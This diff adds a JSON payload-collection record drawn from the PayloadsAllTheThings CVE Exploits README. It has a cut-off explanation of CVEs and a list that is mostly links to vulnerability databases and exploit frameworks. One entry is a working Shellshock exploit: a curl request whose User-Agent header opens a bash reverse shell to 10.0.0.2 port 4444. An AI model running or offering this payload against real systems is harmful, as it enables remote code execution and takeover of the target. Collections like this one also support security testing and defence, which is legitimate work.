@@ -1,0 +1,22 @@
+{
+  "id": "rce-bdac9594f64d",
+  "category": "RCE",
+  "title": "README",
+  "description": "# Common Vulnerabilities and Exposures\n\n> A CVE (Common Vulnerabilities and Exposures) is a unique identifier assigned to a publicly known cybersecurity vulnerability. CVEs help standardize the naming and tracking of vulnerabilities, making it easier for organizations, security professionals, and software vendors to share information and manage risks associated with these vulnerabilities. Each CVE entry includes a brief description of the vulnerability, its potential impact, and details about af",
+  "payloads": [
+    "* [Trickest CVE Repository - Automated collection of CVEs and PoC's](https://github.com/trickest/cve)",
+    "* [Nuclei Templates - Community curated list of templates for the nuclei engine to find security vulnerabilities in applications](https://github.com/projectdiscovery/nuclei-templates)",
+    "* [Metasploit Framework](https://github.com/rapid7/metasploit-framework)",
+    "* [CVE Details - The ultimate security vulnerability datasource](https://www.cvedetails.com)",
+    "curl --silent -k -H \"User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1\" \"https://10.0.0.1/cgi-bin/admin.cgi\"",
+    "* [Heartbleed - Official website](http://heartbleed.com)",
+    "* [Shellshock - Wikipedia](https://en.wikipedia.org/wiki/Shellshock_(software_bug))",
+    "* [Imperva Apache Struts analysis](https://www.imperva.com/blog/2017/03/cve-2017-5638-new-remote-code-execution-rce-vulnerability-in-apache-struts-2/)",
+    "* [EternalBlue - Wikipedia](https://en.wikipedia.org/wiki/EternalBlue)",
+    "* [BlueKeep - Microsoft](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708)"
+  ],
+  "references": [
+    "PayloadsAllTheThings/CVE Exploits/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
